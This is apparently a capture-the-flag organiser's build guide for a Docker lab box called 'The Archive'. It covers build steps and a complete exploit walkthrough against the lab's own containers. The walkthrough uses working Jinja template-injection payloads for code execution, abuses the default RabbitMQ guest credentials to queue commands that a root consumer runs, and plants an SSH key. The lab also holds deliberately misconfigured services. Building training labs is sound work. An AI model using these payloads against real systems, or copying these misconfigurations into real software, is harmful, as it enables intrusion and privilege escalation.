# AM-05: The Archive — Director Build Guide

> **EYES ONLY — DIRECTORS.** Full exploit chain. Do not distribute to
> players. Player-facing material is in `PLAYER_BRIEF.md`.

## Overview

| | |
|---|---|
| Difficulty | Hard |
| Source | Custom-built (no VulnHub source) |
| Topology | Two containers — `archive` (public) + `archive-consumer` (internal, runs MQ consumer as root) |
| Base image | `debian:11-slim` (both) |
| Services | SSH (22), document service (8443, HTTPS Flask), RabbitMQ (5672) |
| Intended path | SSTI → RCE → RabbitMQ MQ injection → consumer writes root flag to shared volume |
| CP | User 450, Root 600 |
| Flags | `DZ{user_archive_<hash>}`, `DZ{root_archive_<hash>}` |
| Lore | Fragment E — founding charter confirms the surface was habitable (all factions) |

---

## Build & Run

```bash
cd Anomaly_Machines/AM-05_archive
cd ../ && ./generate_flags.sh && cd AM-05_archive

export AM05_USER_FLAG="$(python3 -c "import json;print(json.load(open('../event_flags.json'))['AM-05: The Archive — User Flag'])")"
export AM05_ROOT_FLAG="$(python3 -c "import json;print(json.load(open('../event_flags.json'))['AM-05: The Archive — Root Flag'])")"

docker compose -f docker-compose.yml -f docker-compose.dev.yml up -d --build
docker compose logs -f
```

Dev ports: `2225:22`, `8443:8443`, `5672:5672`.

### Topology

```
archive (public):
  - SSH :22 (key-only)
  - Flask document service :8443 (HTTPS, SSTI vulnerability)
  - RabbitMQ :5672 (guest/guest, loopback_users=none)

archive-consumer (internal, not published):
  - Python RabbitMQ consumer running as root
  - Connects to archive:5672, listens on 'archive_commands' queue
  - Executes commands from messages, writes output to /shared_archive/

shared_archive volume: mounted on both containers at /shared_archive
```

---

## Exploit Chain — Full Walkthrough

### Stage 1 — Enumerate

```bash
nmap -sV -sC localhost   # dev: ports 2225, 8443, 5672
# 22/tcp   open  ssh     OpenSSH
# 8443/tcp open  ssl/http Flask (document service)
# 5672/tcp open  amqp    RabbitMQ
```

### Stage 2 — Document service + SSTI

```bash
# Browse the document service (self-signed cert — use -k):
curl -sk https://localhost:8443/
# Archive Document Portal with upload form

# Test SSTI with a simple expression:
curl -sk -X POST -d 'content={{ 7*7 }}' https://localhost:8443/upload
# Response contains: 49

# RCE via SSTI:
curl -sk -X POST \
  --data-urlencode 'content={{ config.__class__.__init__.__globals__["os"].popen("id").read() }}' \
  https://localhost:8443/upload
# uid=33(www-data) ...
```

### Stage 3 — User flag via SSTI

```bash
curl -sk -X POST \
  --data-urlencode 'content={{ config.__class__.__init__.__globals__["os"].popen("cat /home/archivist/user.txt").read() }}' \
  https://localhost:8443/upload
# DZ{user_archive_<hash>}
```

### Stage 4 — Discover RabbitMQ

```bash
# From the SSTI RCE, or by enumerating ports:
curl -sk -X POST \
  --data-urlencode 'content={{ config.__class__.__init__.__globals__["os"].popen("rabbitmqctl status").read() }}' \
  https://localhost:8443/upload
# RabbitMQ is running. Default creds: guest/guest.
```

### Stage 5 — MQ injection privesc

The SSTI runs as `www-data`, which can't `pip3 install pika` to the default
location (`/var/www/` doesn't exist). Install to a temp dir with `--target`
and use `PYTHONPATH` — all in one SSTI command:

```bash
# Install pika to a temp dir AND send the MQ message via SSTI:
curl -sk -X POST \
  --data-urlencode 'content={{ config.__class__.__init__.__globals__["os"].popen("TMPDIR=$(mktemp -d); pip3 install --target=$TMPDIR pika 2>&1; PYTHONPATH=$TMPDIR python3 -c \"import pika; c=pika.BlockingConnection(pika.ConnectionParameters(\\\"localhost\\\",5672,credentials=pika.PlainCredentials(\\\"guest\\\",\\\"guest\\\")));ch=c.channel();ch.queue_declare(queue=\\\"archive_commands\\\");ch.basic_publish(exchange=\\\"\\\",routing_key=\\\"archive_commands\\\",body=\\\"cat /root/root.txt > /shared_archive/root_flag.txt; chmod 444 /shared_archive/root_flag.txt\\\");c.close()\"").read() }}' \
  https://localhost:8443/upload
```

Or via a shell on archive (run as root):
```bash
# Install pika (as root this works):
pip3 install pika

# Publish the privesc command:
python3 -c "
import pika
conn = pika.BlockingConnection(pika.ConnectionParameters('localhost', 5672,
    credentials=pika.PlainCredentials('guest','guest')))
ch = conn.channel()
ch.queue_declare(queue='archive_commands')
ch.basic_publish(exchange='', routing_key='archive_commands',
    body='cat /root/root.txt > /shared_archive/root_flag.txt; chmod 444 /shared_archive/root_flag.txt')
conn.close()
"
```

### Stage 6 — Root flag

```bash
# The consumer on archive-consumer executes the command as root and
# writes the root flag to the shared volume. Read it from archive:
cat /shared_archive/root_flag.txt
# DZ{root_archive_<hash>}
```

### Stage 7 — Lore Fragment E

```bash
curl -sk https://localhost:8443/documents/
# Lists: founding_charter.txt

curl -sk https://localhost:8443/documents/founding_charter.txt
# Fragment E — the founding charter confirming the surface was habitable.
```

---

## Validation (automated)

```bash
cd Anomaly_Machines/AM-05_archive
docker compose -f docker-compose.yml -f docker-compose.dev.yml --profile test up --build --abort-on-container-exit
```

---

## Architecture notes

- **RabbitMQ** requires Erlang (~200MB dependency). The archive image is
  larger than AM-01–04. Acceptable for a Hard box.
- **Flask HTTPS** uses a self-signed cert generated at build time. Players
  use `curl -k` or equivalent.
- **RabbitMQ `guest` user** — `loopback_users = none` in rabbitmq.conf
  allows connections from any host (the misconfig). The consumer on the
  internal network connects as `guest`.
- **Shared volume** — the consumer writes the root flag to
  `/shared_archive/root_flag.txt`. The player reads it from the archive
  container at the same path.
- **No SSH access** for players pre-foothold (key-only, no known key).
  After SSTI, players can inject a key into `/home/archivist/.ssh/authorized_keys`
  for a proper TTY.